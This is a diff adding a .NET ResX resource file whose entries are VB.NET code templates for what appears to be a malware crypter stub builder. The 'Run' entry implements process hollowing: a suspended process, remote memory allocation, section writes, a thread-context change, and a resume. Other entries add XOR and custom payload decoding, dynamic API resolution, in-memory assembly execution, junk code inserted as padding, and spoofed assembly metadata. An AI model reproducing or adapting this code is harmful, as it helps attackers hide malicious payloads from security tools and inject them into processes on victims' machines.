@@ -1,0 +1,378 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="API" xml:space="preserve">
+    <value>&lt;DllImport("kernel32.dll", EntryPoint:="!R1")&gt; _
+Function !N1(ByVal ?N2 As String) As IntPtr
+End Function
+$GB
+&lt;DllImport("kernel32.dll", EntryPoint:="GetProcAddress")&gt; _
+Function !N1(ByVal ?N2 As IntPtr, ByVal ?N3 As String) As IntPtr
+End Function
+$GB
+Function !N1(Of ?N2)(!P1) As ?N2
+$PV
+$PV
+Return CType(CType(Marshal.GetDelegateForFunctionPointer(!N1(!N1(?N3.Split(Convert.ToChar(58))(0)), ?N3.Split(Convert.ToChar(58))(1)), GetType(?N2)), Object), ?N2)
+End Function
+$GB</value>
+  </data>
+  <data name="GetBytes" xml:space="preserve">
+    <value>Function !N1(!P1) As Byte()
+$PV
+Dim ?N2 As Drawing.Color = Drawing.Color.FromArgb(?N1)
+$PV
+Return New Byte() {?N2.B, ?N2.G, ?N2.R, ?N2.A}
+End Function
+$GB</value>
+  </data>
+  <data name="Native" xml:space="preserve">
+    <value>Delegate Function ?N5 (ByVal !N1 As String) As IntPtr
+$GB
+Delegate Function ?N6 (ByVal !N1 As IntPtr, ByVal ?N1 As String, ByVal ?N2 As String) As IntPtr
+$GB
+Delegate Function ?N7 (ByVal !N1 As IntPtr, ByVal ?N1 As IntPtr) As Integer
+$GB
+Delegate Function ?N8 (ByVal !N1 As IntPtr, ByVal ?N1 As IntPtr) As IntPtr
+$GB
+Function !N1(!P1) As Byte()
+$PV
+Dim ?N2 As IntPtr = !D1(Assembly.GetEntryAssembly.Location)
+Dim ?N3 As IntPtr = !D2(?N2, ?N1, !S1)
+Dim ?N4(!D3(?N2, ?N3) - 1) As Byte
+Marshal.Copy(!D4(?N2, ?N3), ?N4, 0, ?N4.Length)
+$PV
+Return ?N4
+End Function
+$GB</value>
+  </data>
+  <data name="Wow64" xml:space="preserve">
+    <value>Delegate Function ?N3(ByVal handle As IntPtr, ByRef result As Boolean) As Boolean
+Function !N1(!P1) As Boolean
+If IntPtr.Size = 8 Then Return True
+Dim ?N1 As Version = Environment.OSVersion.Version
+If ?N1.Major = 5 And ?N1.Minor &gt; 0 Or ?N1.Major &gt; 5 Then
+Dim ?N2 As Boolean
+If Not !D1(Process.GetCurrentProcess.Handle, ?N2) Then Return False
+Return ?N2
+End If
+Return False
+End Function</value>
+  </data>
+  <data name="AssemblyEditor" xml:space="preserve">
+    <value>&lt;Assembly: AssemblyTitle("{1}")&gt; 
+&lt;Assembly: AssemblyDescription("{2}")&gt; 
+&lt;Assembly: AssemblyCompany("{3}")&gt; 
+&lt;Assembly: AssemblyProduct("{4}")&gt; 
+&lt;Assembly: AssemblyCopyright("{5}")&gt; 
+&lt;Assembly: AssemblyTrademark("{6}")&gt;
+&lt;Assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")&gt;
+&lt;Assembly: AssemblyVersion("{7}.{8}.{9}.{10}")&gt;</value>
+  </data>
+  <data name="String_" xml:space="preserve">
+    <value>Function !N1(!P1) As String
+$PV
+$PV
+Return Encoding.UTF8.GetString(!R1)
+End Function
+$GB</value>
+  </data>
+  <data name="Numeric" xml:space="preserve">
+    <value>Function !N1(!P1) As Byte()
+$PV
+Dim ?N2 As New MemoryStream, ?N3 As Byte()
+For Each ?N4 As Object In ?N1
+If TypeOf ?N4 Is Byte() Then
+?N3 = DirectCast(?N4, Byte())
+?N2.Write(?N3, 0, ?N3.Length)
+Else
+For Each ?N5 As ULong In DirectCast(?N4, ULong())
+?N3 = BitConverter.GetBytes(?N5)
+?N2.Write(?N3, 0, ?N3.Length)
+Next
+End If
+Next
+!N1 = ?N2.ToArray
+?N2.Close()
+$PV
+End Function
+$GB</value>
+  </data>
+  <data name="String1" xml:space="preserve">
+    <value>Sokrat ti u gacama</value>
+  </data>
+  <data name="XOR_" xml:space="preserve">
+    <value>Function !N1(!P1) As Byte()
+$PV
+Dim ?N2 As Byte() = !R1
+Dim ?N3 As Integer = ?N2.Length
+For ?N4 As Integer = 0 To ?N1.Length - 1
+?N1(?N4) = ?N1(?N4) Xor ?N2(?N4 Mod ?N3)
+Next
+$PV
+Return ?N1
+End Function
+$GB</value>
+  </data>
+  <data name="Run" xml:space="preserve">
+    <value>Delegate Function ?N21(ByVal !N1 As String, ByVal ?N2 As String, ByVal ?N3 As IntPtr, ByVal ?N4 As IntPtr, ByVal ?N5 As Boolean, ByVal ?N6 As Integer, ByVal ?N7 As IntPtr, ByVal ?N8 As String, ByVal ?N9 As Byte(), ByVal ?N10 As IntPtr()) As Boolean
+$GB
+Delegate Function ?N22(ByVal !N1 As IntPtr, ByVal ?N2 As UInteger()) As Boolean
+$GB
+Delegate Function ?N23(ByVal !N1 As IntPtr, ByVal ?N2 As IntPtr, ByRef ?N3 As IntPtr, ByVal ?N4 As IntPtr, ByRef ?N5 As IntPtr) As Boolean
+$GB
+Delegate Function ?N24(ByVal !N1 As IntPtr, ByVal ?N2 As IntPtr) As UInteger
+$GB
+Delegate Function ?N25(ByVal !N1 As IntPtr, ByVal ?N2 As IntPtr, ByVal ?N3 As IntPtr, ByVal ?N4 As Integer, ByVal ?N5 As Integer) As IntPtr
+$GB
+Delegate Function ?N26(ByVal !N1 As IntPtr, ByVal ?N2 As IntPtr, ByVal ?N3 As Byte(), ByVal ?N4 As IntPtr, ByRef ?N5 As IntPtr) As Boolean
+$GB
+Delegate Function ?N27(ByVal !N1 As IntPtr) As Integer
+$GB
+Sub ?N29(ByVal !N1 As Object)
+$PV
+Dim ?N1 As MethodInfo = Assembly.Load(DirectCast(!N1, Byte())).EntryPoint
+If ?N1.GetParameters.Length = 0 Then ?N1.Invoke(Nothing, Nothing) Else ?N1.Invoke(Nothing, New Object() {New String() {}})
+$PV
+End Sub
+$GB
+Sub !N1(!P1)
+$PV
+For ?N31 As Integer = 0 to 100
+Dim ?N32 As Byte = CByte(?N31)
+Next
+If !N1(60) = 128 Then
+Dim ?N33 As Short = 2302
+Dim ?N28 As New Threading.Thread(AddressOf ?N29)
+?N28.SetApartmentState(ApartmentState.STA)
+For ?N34 As Byte = 0 To 20
+For ?N35 As Integer = ?N34 To 30
+If ?N35 = 25 Then Exit For
+Next
+Next
+?N28.Start(!N1)
+Else
+Dim ?N2 As String = Assembly.GetEntryAssembly.Location
+If Directory.Exists(Environment.SystemDirectory(0) &amp; !S1) Then
+For Each ?N3 As String In Directory.GetDirectories(Environment.SystemDirectory(0) &amp; !S2)
+If ?N3.ToLower.Contains(!S3) Then
+?N2 = ?N3 &amp; !S4
+Exit For
+End If
+Next
+End If
+Dim ?N36 As Byte() = New Byte(){0,1,2,3,4,5}
+Dim ?N4 As Integer() = New Integer() {1, 16, 2, 32, 4, 64, 4, 64}
+Dim ?N5 As Integer = !R1
+Dim ?N6 As Integer = BitConverter.ToInt16(!N1, ?N5 + 6)
+Dim ?N37 As Boolean = False
+Dim ?N7 As New IntPtr(!R2)
+Dim ?N9(3) As IntPtr
+?N37 = True
+If Not !D1(Nothing, ?N2, Nothing, Nothing, False, 4, Nothing, Nothing, New Byte() {}, ?N9) Then Return
+Try
+Dim ?N10(178) As UInteger, ?N11, ?N12, ?N13 As IntPtr, ?N14 As Boolean
+?N10(0) = 65538
+If !D2(?N9(1), ?N10) Then
+?N37 = False
+If !D3(?N9(0), New IntPtr(?N10(41) + 8), ?N13, New IntPtr(4), ?N12) Then
+If !D4(?N9(0), ?N13) = 0 Then
+?N11 = !D5(?N9(0), New IntPtr(!R3), New IntPtr(!R4), 12288, 64)
+Dim ?N30 As ?N26 = !D6
+?N36 = nothing
+?N14 = ?N30(?N9(0), ?N11, !N1, ?N7, ?N12)
+Dim ?N17(9) As Integer
+?N37 = True
+For ?N16 As Integer = 0 To ?N6 - 1
+?N17(0) = 13
+?N17(5) = 255 + ?N17(0)
+Buffer.BlockCopy(!N1, ?N5 + 248 + (?N16 * 40), ?N17, 0, 40)
+Dim ?N18(?N17(4) - 1) As Byte
+Buffer.BlockCopy(!N1, ?N17(5), ?N18, 0, ?N18.Length)
+Dim ?N38 As String = ?N17.Length.ToString()
+?N14 = ?N30(?N9(0), New IntPtr(?N11.ToInt32 + ?N17(3)), ?N18, New IntPtr(?N18.Length), ?N12)
+Next
+?N37 = False
+?N14 = ?N30(?N9(0), New IntPtr(?N10(41) + 8), !R5, New IntPtr(4), ?N12)
+?N10(44) = CUInt(?N11.ToInt32 + !R6)
+!D7(?N9(1), ?N10)
+!D8(?N9(1))
+Return
+End If
+End If
+End If
+Catch
+End Try
+Diagnostics.Process.GetProcessById(?N9(2).ToInt32).Kill()
+End If
+$PV
+End Sub
+$GB</value>
+  </data>
+  <data name="ToInt32" xml:space="preserve">
+    <value>Function !N1(!P1) As Integer
+$PV
+$PV
+Return Drawing.Color.FromArgb(?N1(?N2 + 3), ?N1(?N2 + 2), ?N1(?N2 + 1), ?N1(?N2)).ToArgb
+End Function
+$GB</value>
+  </data>
+  <data name="Decode" xml:space="preserve">
+    <value>Private ?N9 As Byte() = New Byte() {0, 0, 10, 12, 13, 15, 34, 127, 133}
+$GB
+Function !N1(!P1) As Byte()
+$PV
+Dim ?N2(8) As Byte, ?N3 As New Dictionary(Of Char, Byte)(255)
+Dim ?N4 As New MemoryStream(?N1.Length), ?N5 As Byte, ?N6 As Boolean, ?N7 As Integer
+For ?N8 As Integer = 0 To 255
+?N3.Add(Convert.ToChar(?N8), CByte(?N8))
+Next
+?N9(0) = ?N3(?N1(0))
+For ?N8 As Byte = 1 To 9
+?N2(?N8 - 1) = ?N3(?N1(?N8))
+Next
+For ?N8 As Integer = 10 To ?N1.Length - 1
+?N5 = ?N3(?N1(?N8))
+If ?N5 = ?N9(0) Then
+?N6 = True
+Else
+?N7 = Array.IndexOf(?N2, ?N5)
+If ?N7 &gt; -1 Then
+If ?N6 Then
+?N4.WriteByte(?N5)
+?N6 = False
+Else
+?N4.WriteByte(?N9(?N7))
+End If
+Else
+?N4.WriteByte(?N5)
+End If
+End If
+Next
+!N1 = ?N4.ToArray
+?N4.Close()
+$PV
+End Function
+$GB</value>
+  </data>
+  <assembly alias="System.Windows.Forms" name="System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" />
+  <data name="header" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\header.png;System.Drawing.Bitmap, System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+</root>
